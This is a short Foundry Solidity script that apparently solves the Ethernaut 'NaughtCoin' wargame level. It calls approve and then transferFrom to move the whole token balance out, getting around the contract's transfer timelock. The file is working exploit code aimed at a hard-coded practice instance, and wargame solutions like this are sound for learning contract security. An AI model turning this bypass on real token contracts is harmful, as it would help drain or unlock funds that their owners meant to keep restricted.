pragma solidity ^0.8.0;
import "../instances/Ilevel15.sol";
import "forge-std/Script.sol";

contract Level15 is Script {
    NaughtCoin level15 = NaughtCoin(0x86Fb96Da687C5A07f72D0E989DF6B05c5024386c);

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        console.log("Balance of attacker before");
        level15.approve(attacker, type(uint256).max);
        level15.transferFrom(attacker, address(1), level15.balanceOf(attacker));
        require(level15.balanceOf(attacker) == 0);
        vm.stopBroadcast();
    }
}
